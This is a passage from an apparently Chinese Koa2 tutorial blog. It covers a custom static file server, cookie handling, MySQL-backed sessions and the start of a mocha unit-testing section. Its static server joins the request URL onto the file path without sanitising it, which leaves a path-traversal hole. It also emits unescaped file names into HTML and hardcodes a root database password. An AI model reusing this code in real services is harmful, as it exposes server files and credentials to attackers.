静态资源目录对于相对入口文件index.js的路径</span></span><br><span class="line"><span class="keyword">const</span> staticPath = <span class="string">&#x27;./static&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析资源类型</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">parseMime</span>(<span class="params"> url </span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> extName = path.<span class="title function_">extname</span>( url )</span><br><span class="line">  extName = extName ?  extName.<span class="title function_">slice</span>(<span class="number">1</span>) : <span class="string">&#x27;unknown&#x27;</span></span><br><span class="line">  <span class="keyword">return</span>  mimes[ extName ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>( <span class="keyword">async</span> ( ctx ) =&gt; &#123;</span><br><span class="line">  <span class="comment">// 静态资源目录在本地的绝对路径</span></span><br><span class="line">  <span class="keyword">let</span> fullStaticPath = path.<span class="title function_">join</span>(__dirname, staticPath)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取静态资源内容，有可能是文件内容，目录，或404</span></span><br><span class="line">  <span class="keyword">let</span> _content = <span class="keyword">await</span> <span class="title function_">content</span>( ctx, fullStaticPath )</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 解析请求内容的类型</span></span><br><span class="line">  <span class="keyword">let</span> _mime = <span class="title function_">parseMime</span>( ctx.<span class="property">url</span> )</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果有对应的文件类型，就配置上下文的类型</span></span><br><span class="line">  <span class="keyword">if</span> ( _mime ) &#123;</span><br><span class="line">    ctx.<span class="property">type</span> = _mime</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 输出静态资源内容</span></span><br><span class="line">  <span class="keyword">if</span> ( _mime &amp;&amp; _mime.<span class="title function_">indexOf</span>(<span class="string">&#x27;image/&#x27;</span>) &gt;= <span class="number">0</span> ) &#123;</span><br><span class="line">    <span class="comment">// 如果是图片，则用node原生res，输出二进制数据</span></span><br><span class="line">    ctx.<span class="property">res</span>.<span class="title function_">writeHead</span>(<span class="number">200</span>)</span><br><span class="line">    ctx.<span class="property">res</span>.<span class="title function_">write</span>(_content, <span class="string">&#x27;binary&#x27;</span>)</span><br><span class="line">    ctx.<span class="property">res</span>.<span class="title function_">end</span>()</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 其他则输出文本</span></span><br><span class="line">    ctx.<span class="property">body</span> = _content</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[demo] static-server is starting at port 3000&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>util&#x2F;content.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 封装读取目录内容方法</span></span><br><span class="line"><span class="keyword">const</span> dir = <span class="built_in">require</span>(<span class="string">&#x27;./dir&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 封装读取文件内容方法</span></span><br><span class="line"><span class="keyword">const</span> file = <span class="built_in">require</span>(<span class="string">&#x27;./file&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取静态资源内容</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  &#123;<span class="type">object</span>&#125; ctx koa上下文</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  &#123;<span class="type">string</span>&#125; 静态资源目录在本地的绝对路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  &#123;<span class="type">string</span>&#125; 请求获取到的本地内容</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">content</span>(<span class="params"> ctx, fullStaticPath </span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 封装请求资源的完绝对径</span></span><br><span class="line">  <span class="keyword">let</span> reqPath = path.<span class="title function_">join</span>(fullStaticPath, ctx.<span class="property">url</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 判断请求路径是否为存在目录或者文件</span></span><br><span class="line">  <span class="keyword">let</span> exist = fs.<span class="title function_">existsSync</span>( reqPath )</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 返回请求内容， 默认为空</span></span><br><span class="line">  <span class="keyword">let</span> content = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>( !exist ) &#123;</span><br><span class="line">    <span class="comment">//如果请求路径不存在，返回404</span></span><br><span class="line">    content = <span class="string">&#x27;404 Not Found! o(╯□╰)o！&#x27;</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//判断访问地址是文件夹还是文件</span></span><br><span class="line">    <span class="keyword">let</span> stat = fs.<span class="title function_">statSync</span>( reqPath )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( stat.<span class="title function_">isDirectory</span>() ) &#123;</span><br><span class="line">      <span class="comment">//如果为目录，则渲读取目录内容</span></span><br><span class="line">      content = <span class="title function_">dir</span>( ctx.<span class="property">url</span>, reqPath )</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 如果请求为文件，则读取文件内容</span></span><br><span class="line">      content = <span class="keyword">await</span> <span class="title function_">file</span>( reqPath )</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> content</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = content</span><br></pre></td></tr></table></figure><p><strong>util&#x2F;dir.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历读取目录内容方法</span></span><br><span class="line"><span class="keyword">const</span> walk = <span class="built_in">require</span>(<span class="string">&#x27;./walk&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 封装目录内容</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  &#123;<span class="type">string</span>&#125; url 当前请求的上下文中的url，即ctx.url</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  &#123;<span class="type">string</span>&#125; reqPath 请求静态资源的完整本地路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> &#123;<span class="type">string</span>&#125; 返回目录内容，封装成HTML</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">dir</span> ( url, reqPath ) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 遍历读取当前目录下的文件、子目录</span></span><br><span class="line">  <span class="keyword">let</span> contentList = <span class="title function_">walk</span>( reqPath )</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> html = <span class="string">`&lt;ul&gt;`</span></span><br><span class="line">  <span class="keyword">for</span> ( <span class="keyword">let</span> [ index, item ] <span class="keyword">of</span> contentList.<span class="title function_">entries</span>() ) &#123;</span><br><span class="line">    html = <span class="string">`<span class="subst">$&#123;html&#125;</span>&lt;li&gt;&lt;a href=&quot;<span class="subst">$&#123;url === <span class="string">&#x27;/&#x27;</span> ? <span class="string">&#x27;&#x27;</span> : url&#125;</span>/<span class="subst">$&#123;item&#125;</span>&quot;&gt;<span class="subst">$&#123;item&#125;</span>&lt;/a&gt;`</span> </span><br><span class="line">  &#125;</span><br><span class="line">  html = <span class="string">`<span class="subst">$&#123;html&#125;</span>&lt;/ul&gt;`</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> html</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = dir</span><br></pre></td></tr></table></figure><p><strong>util&#x2F;file.js</strong></p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="keyword">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取文件方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  &#123;string&#125; 文件本地的绝对路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> &#123;string|binary&#125; </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file</span> <span class="params">( filePath )</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">let</span> content = fs.readFileSync(filePath, <span class="string">&#x27;binary&#x27;</span> )</span><br><span class="line"> <span class="keyword">return</span> content</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module.exports = file</span><br></pre></td></tr></table></figure><p><strong>util&#x2F;walk.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> mimes = <span class="built_in">require</span>(<span class="string">&#x27;./mimes&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 遍历读取目录内容（子目录，文件名）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  &#123;<span class="type">string</span>&#125; reqPath 请求资源的绝对路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> &#123;<span class="type">array</span>&#125; 目录内容列表</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">walk</span>(<span class="params"> reqPath </span>)&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> files = fs.<span class="title function_">readdirSync</span>( reqPath );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> dirList = [], fileList = [];</span><br><span class="line">  <span class="keyword">for</span>( <span class="keyword">let</span> i=<span class="number">0</span>, len=files.<span class="property">length</span>; i&lt;len; i++ ) &#123;</span><br><span class="line">    <span class="keyword">let</span> item = files[i];</span><br><span class="line">    <span class="keyword">let</span> itemArr = item.<span class="title function_">split</span>(<span class="string">&quot;\.&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> itemMime = ( itemArr.<span class="property">length</span> &gt; <span class="number">1</span> ) ? itemArr[ itemArr.<span class="property">length</span> - <span class="number">1</span> ] : <span class="string">&quot;undefined&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">typeof</span> mimes[ itemMime ] === <span class="string">&quot;undefined&quot;</span> ) &#123;</span><br><span class="line">      dirList.<span class="title function_">push</span>( files[i] );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      fileList.<span class="title function_">push</span>( files[i] );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> result = dirList.<span class="title function_">concat</span>( fileList );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = walk;</span><br></pre></td></tr></table></figure><p><strong>util&#x2F;mime.js</strong></p><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> mimes = &#123;</span><br><span class="line">  <span class="symbol">&#x27;css&#x27;</span>: <span class="symbol">&#x27;text</span>/css&#x27;,</span><br><span class="line">  <span class="symbol">&#x27;less&#x27;</span>: <span class="symbol">&#x27;text</span>/css&#x27;,</span><br><span class="line">  <span class="symbol">&#x27;gif&#x27;</span>: <span class="symbol">&#x27;image</span>/gif&#x27;,</span><br><span class="line">  <span class="symbol">&#x27;html&#x27;</span>: <span class="symbol">&#x27;text</span>/html&#x27;,</span><br><span class="line">  <span class="symbol">&#x27;ico&#x27;</span>: <span class="symbol">&#x27;image</span>/x-icon&#x27;,</span><br><span class="line">  <span class="symbol">&#x27;jpeg&#x27;</span>: <span class="symbol">&#x27;image</span>/jpeg&#x27;,</span><br><span class="line">  <span class="symbol">&#x27;jpg&#x27;</span>: <span class="symbol">&#x27;image</span>/jpeg&#x27;,</span><br><span class="line">  <span class="symbol">&#x27;js&#x27;</span>: <span class="symbol">&#x27;text</span>/javascript&#x27;,</span><br><span class="line">  <span class="symbol">&#x27;json&#x27;</span>: <span class="symbol">&#x27;application</span>/json&#x27;,</span><br><span class="line">  <span class="symbol">&#x27;pdf&#x27;</span>: <span class="symbol">&#x27;application</span>/pdf&#x27;,</span><br><span class="line">  <span class="symbol">&#x27;png&#x27;</span>: <span class="symbol">&#x27;image</span>/png&#x27;,</span><br><span class="line">  <span class="symbol">&#x27;svg&#x27;</span>: <span class="symbol">&#x27;image</span>/svg+xml&#x27;,</span><br><span class="line">  <span class="symbol">&#x27;swf&#x27;</span>: <span class="symbol">&#x27;application</span>/x-shockwave-flash&#x27;,</span><br><span class="line">  <span class="symbol">&#x27;tiff&#x27;</span>: <span class="symbol">&#x27;image</span>/tiff&#x27;,</span><br><span class="line">  <span class="symbol">&#x27;txt&#x27;</span>: <span class="symbol">&#x27;text</span>/plain&#x27;,</span><br><span class="line">  <span class="symbol">&#x27;wav&#x27;</span>: <span class="symbol">&#x27;audio</span>/x-wav&#x27;,</span><br><span class="line">  <span class="symbol">&#x27;wma&#x27;</span>: <span class="symbol">&#x27;audio</span>/x-ms-wma&#x27;,</span><br><span class="line">  <span class="symbol">&#x27;wmv&#x27;</span>: <span class="symbol">&#x27;video</span>/x-ms-wmv&#x27;,</span><br><span class="line">  <span class="symbol">&#x27;xml&#x27;</span>: <span class="symbol">&#x27;text</span>/xml&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module.exports = mimes</span><br></pre></td></tr></table></figure><h2 id="koa2使用cookie"><a href="#koa2使用cookie" class="headerlink" title="koa2使用cookie"></a>koa2使用cookie</h2><p>koa提供了从上下文直接读取、写入cookie的方法</p><ul><li>ctx.cookies.get(name, [options]) 读取上下文请求中的cookie</li><li>ctx.cookies.set(name, value, [options]) 在上下文中写入cookie</li></ul><blockquote><p>koa2 中操作的cookies是使用了npm的cookies模块，源码在<a href="https://github.com/pillarjs/cookies">https://github.com/pillarjs/cookies</a>，所以在读写cookie的使用参数与该模块的使用一致。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Koa</span> = <span class="built_in">require</span>(<span class="string">&#x27;koa&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Koa</span>()</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>( <span class="keyword">async</span> ( ctx ) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( ctx.<span class="property">url</span> === <span class="string">&#x27;/index&#x27;</span> ) &#123;</span><br><span class="line">    ctx.<span class="property">cookies</span>.<span class="title function_">set</span>(</span><br><span class="line">      <span class="string">&#x27;cid&#x27;</span>, </span><br><span class="line">      <span class="string">&#x27;hello world&#x27;</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">domain</span>: <span class="string">&#x27;localhost&#x27;</span>,  <span class="comment">// 写cookie所在的域名</span></span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;/index&#x27;</span>,       <span class="comment">// 写cookie所在的路径</span></span><br><span class="line">        <span class="attr">maxAge</span>: <span class="number">10</span> * <span class="number">60</span> * <span class="number">1000</span>, <span class="comment">// cookie有效时长</span></span><br><span class="line">        <span class="attr">expires</span>: <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&#x27;2017-02-15&#x27;</span>),  <span class="comment">// cookie失效时间</span></span><br><span class="line">        <span class="attr">httpOnly</span>: <span class="literal">false</span>,  <span class="comment">// 是否只用于http请求中获取</span></span><br><span class="line">        <span class="attr">overwrite</span>: <span class="literal">false</span>  <span class="comment">// 是否允许重写</span></span><br><span class="line">      &#125;</span><br><span class="line">    )</span><br><span class="line">    ctx.<span class="property">body</span> = <span class="string">&#x27;cookie is ok&#x27;</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ctx.<span class="property">body</span> = <span class="string">&#x27;hello world&#x27;</span> </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[demo] cookie is starting at port 3000&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="koa2实现session"><a href="#koa2实现session" class="headerlink" title="koa2实现session"></a>koa2实现session</h2><p>koa2原生功能只提供了cookie的操作，但是没有提供session操作。session就只用自己实现或者通过第三方中间件实现。在koa2中实现session的方案有一下几种</p><ul><li>如果session数据量很小，可以直接存在内存中</li><li>如果session数据量很大，则需要存储介质存放session数据</li></ul><h5 id="数据库存储方案"><a href="#数据库存储方案" class="headerlink" title="数据库存储方案"></a>数据库存储方案</h5><ul><li>将session存放在MySQL数据库中</li><li>需要用到中间件<br>1 koa-session-minimal 适用于koa2 的session中间件，提供存储介质的读写接口 。<br>2 koa-mysql-session 为koa-session-minimal中间件提供MySQL数据库的session数据读写操作。<br>3 将sessionId和对于的数据存到数据库</li><li>将数据库的存储的sessionId存到页面的cookie中</li><li>根据cookie的sessionId去获取对于的session信息<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Koa</span> = <span class="built_in">require</span>(<span class="string">&#x27;koa&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;koa-session-minimal&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">MysqlSession</span> = <span class="built_in">require</span>(<span class="string">&#x27;koa-mysql-session&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Koa</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 配置存储session信息的mysql</span></span><br><span class="line"><span class="keyword">let</span> store = <span class="keyword">new</span> <span class="title class_">MysqlSession</span>(&#123;</span><br><span class="line">  <span class="attr">user</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">  <span class="attr">password</span>: <span class="string">&#x27;abc123&#x27;</span>,</span><br><span class="line">  <span class="attr">database</span>: <span class="string">&#x27;koa_demo&#x27;</span>,</span><br><span class="line">  <span class="attr">host</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 存放sessionId的cookie配置</span></span><br><span class="line"><span class="keyword">let</span> cookie = &#123;</span><br><span class="line">  <span class="attr">maxAge</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// cookie有效时长</span></span><br><span class="line">  <span class="attr">expires</span>: <span class="string">&#x27;&#x27;</span>,  <span class="comment">// cookie失效时间</span></span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// 写cookie所在的路径</span></span><br><span class="line">  <span class="attr">domain</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// 写cookie所在的域名</span></span><br><span class="line">  <span class="attr">httpOnly</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// 是否只用于http请求中获取</span></span><br><span class="line">  <span class="attr">overwrite</span>: <span class="string">&#x27;&#x27;</span>,  <span class="comment">// 是否允许重写</span></span><br><span class="line">  <span class="attr">secure</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="attr">sameSite</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="attr">signed</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用session中间件</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">  <span class="attr">key</span>: <span class="string">&#x27;SESSION_ID&#x27;</span>,</span><br><span class="line">  <span class="attr">store</span>: store,</span><br><span class="line">  <span class="attr">cookie</span>: cookie</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>( <span class="keyword">async</span> ( ctx ) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置session</span></span><br><span class="line">  <span class="keyword">if</span> ( ctx.<span class="property">url</span> === <span class="string">&#x27;/set&#x27;</span> ) &#123;</span><br><span class="line">    ctx.<span class="property">session</span> = &#123;</span><br><span class="line">      <span class="attr">user_id</span>: <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>(<span class="number">36</span>).<span class="title function_">substr</span>(<span class="number">2</span>),</span><br><span class="line">      <span class="attr">count</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    ctx.<span class="property">body</span> = ctx.<span class="property">session</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( ctx.<span class="property">url</span> === <span class="string">&#x27;/&#x27;</span> ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取session信息</span></span><br><span class="line">    ctx.<span class="property">session</span>.<span class="property">count</span> = ctx.<span class="property">session</span>.<span class="property">count</span> + <span class="number">1</span></span><br><span class="line">    ctx.<span class="property">body</span> = ctx.<span class="property">session</span></span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[demo] session is starting at port 3000&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ul><h2 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h2><blockquote><p>测试是一个项目周期里必不可少的环节，开发者在开发过程中也是无时无刻进行“人工测试”，如果每次修改一点代码，都要牵一发动全身都要手动测试关联接口，这样子是禁锢了生产力。为了解放大部分测试生产力，相关的测试框架应运而生，比较出名的有mocha，karma，jasmine等。虽然框架繁多，但是使用起来都是大同小异。</p></blockquote><h5 id="安装测试相关框架"><a href="#安装测试相关框架" class="headerlink" title="安装测试相关框架"></a>安装测试相关框架</h5><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --<span class="built_in">save</span>-<span class="built_in">dev</span> mocha chai supertest</span><br></pre></td></tr></table></figure><ul><li>supertest 模块是http请求测试库，用来请求API接口</li><li>mocha 模块是测试框架</li><li>chai 模块是用来进行测试结果断言库，比如一个判断 1 + 1 是否等于 2</li></ul><p><strong>例子目录</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── index.<span class="keyword">js </span><span class="comment"># api文件</span></span><br><span class="line">├── package.<span class="keyword">json</span></span><br><span class="line"><span class="keyword"></span>└── test <span class="comment"># 测试目录</span></span><br><span class="line">    └── index.test.<span class="keyword">js </span><span class="comment"># 测试用例</span></span><br></pre></td></tr></table></figure><p><strong>所需测试demo</strong></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 